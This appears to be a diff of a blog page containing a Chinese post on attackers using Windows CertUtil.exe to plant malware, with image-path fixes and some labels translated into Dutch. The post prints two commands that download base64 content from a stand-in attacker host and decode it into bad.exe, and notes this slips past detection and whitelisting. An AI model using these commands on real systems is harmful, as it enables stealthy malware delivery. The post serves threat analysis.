@@ -11,13 +11,13 @@
 <meta property="og:url" content="http://wsygoogol.github.io/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/index.html">
 <meta property="og:site_name" content="SY0U&#39;s Blog">
 <meta property="og:description" content="0x00 CertUtil.exe 是什么近期通过蜜罐捕获了多起通过CertUtil植入恶意软件的攻击，所以对这个工具进行了一些简单的研究。 CertUtil是一个Windows的内置程序，用于管理Windows中的证书，使用此程序，可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。 0x01 CertUtil怎么用CertUtil的经典用法是处理Base64编码数">
-<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/cert-2.png">
-<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/cert-3.png">
-<meta property="og:updated_time" content="2018-12-17T06:53:31.685Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/cert-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/cert-3.png">
+<meta property="og:updated_time" content="2018-12-17T07:04:11.791Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻击者利用CertUtil.exe植入恶意软件">
 <meta name="twitter:description" content="0x00 CertUtil.exe 是什么近期通过蜜罐捕获了多起通过CertUtil植入恶意软件的攻击，所以对这个工具进行了一些简单的研究。 CertUtil是一个Windows的内置程序，用于管理Windows中的证书，使用此程序，可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。 0x01 CertUtil怎么用CertUtil的经典用法是处理Base64编码数">
-<meta name="twitter:image" content="d:/gitBlog/themes/landscape/source/upload_image/cert-2.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/cert-2.png">
   
     <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
   
@@ -57,7 +57,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Zoeken"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
@@ -99,17 +99,17 @@
 <li>“-f”用于强制获取指定的URL并更新缓存。</li>
 <li>“-split”用于将文件转储到磁盘上。  </li>
 </ul>
-<p><img src="D:\gitBlog\themes\landscape\source\upload_image\cert-2.png" alt="cert-2"></p>
+<p><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/cert-2.png" alt="cert-2"></p>
 <p>分析中发现certutil.exe的强大之处是处理Base64编码数据：首先对恶意文件进行base64编码，以绕过入侵检测系统， 然后在使用CertUtil.exe下载后再对其进行解码。 </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Temp&gt;certutil.exe -urlcache -split -f <span class="string">"https://hackers.home/badcontent.txt"</span> bad.txt</div><div class="line">C:\Windows\Temp&gt;certutil.exe -decode bad.txt bad.exe</div></pre></td></tr></table></figure>
 <p>攻击者为什么喜欢用CertUtil？因为它是Windows内置的程序，CertUtil可能会被列入白名单。其实利用合法的Windows植入恶意软件非常常见，比如Windows regsvr32.exe就是以类似的方式使用。</p>
 <h4 id="0x02-流量分析"><a href="#0x02-流量分析" class="headerlink" title="0x02 流量分析"></a>0x02 流量分析</h4><p>分析的过程中还发现这个工具使用连个不同的User-Agents（“Microsoft-CryptoAPI/6.1”和“CertUtil URL Agent”）与远程服务器建立两个会话连接，且response包内容一致，以下是抓包对比：</p>
-<p><img src="D:\gitBlog\themes\landscape\source\upload_image\cert-3.png" alt="cert-3"></p>
+<p><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/cert-3.png" alt="cert-3"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/" data-id="cjpryr3vw0017fs9l1a0ygcxj" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/" data-id="cjprz4m0l001cus9lcb6iebr1" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -120,7 +120,7 @@
   
   
     <a href="/2018/09/17/Satori-物联网蠕虫分析/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
+      <strong class="article-nav-caption">Ouder</strong>
       <div class="article-nav-title">Satori 物联网蠕虫分析</div>
     </a>
   
@@ -143,7 +143,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Archieven</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
     </div>
@@ -153,7 +153,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Recente berichten</h3>
     <div class="widget">
       <ul>
         
